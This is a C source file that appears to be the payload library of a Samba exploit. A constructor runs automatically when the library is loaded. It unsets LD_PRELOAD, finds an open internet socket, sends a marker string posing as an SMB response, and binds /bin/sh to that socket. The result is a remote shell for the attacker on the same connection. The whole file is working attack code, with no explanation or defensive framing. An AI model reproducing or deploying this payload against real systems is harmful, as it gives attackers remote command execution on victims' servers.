#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>
#include <string.h>
#include <stdlib.h>

#ifdef OLD_LIB_SET_1
__asm__(".symver execve,execve@GLIBC_2.0");
__asm__(".symver dup2,dup2@GLIBC_2.0");
__asm__(".symver getsockname,getsockname@GLIBC_2.0");
#endif

#ifdef OLD_LIB_SET_2
__asm__(".symver execve,execve@GLIBC_2.2.5");
__asm__(".symver dup2,dup2@GLIBC_2.2.5");
__asm__(".symver getsockname,getsockname@GLIBC_2.2.5");
#endif


static void _run_payload_(void) __attribute__((constructor));

static void _run_payload_(void)
{
  char *args[2] = {"/bin/sh", 0};
  struct sockaddr_in sa;
  socklen_t sl = sizeof(sa);
  int s;
  unsigned char buff[] = {'X','P','W','N','D','X', 0};

  unsetenv("LD_PRELOAD");

  for (s=4096; s>0; s--) {

    // Skip over invalid sockets
    if (getsockname(s, (struct sockaddr *)&sa, &sl) != 0)
      continue;

    // Skip over non internet sockets
    if (sa.sin_family != AF_INET)
      continue;

    // Send a semi-valid SMB response to simplify things
    send(s, buff, sizeof(buff), 0);

    // Duplicate standard input/output/error
    dup2(s, 0);
    dup2(s, 1);
    dup2(s, 2);

    execve(args[0], args, NULL);
  }
}
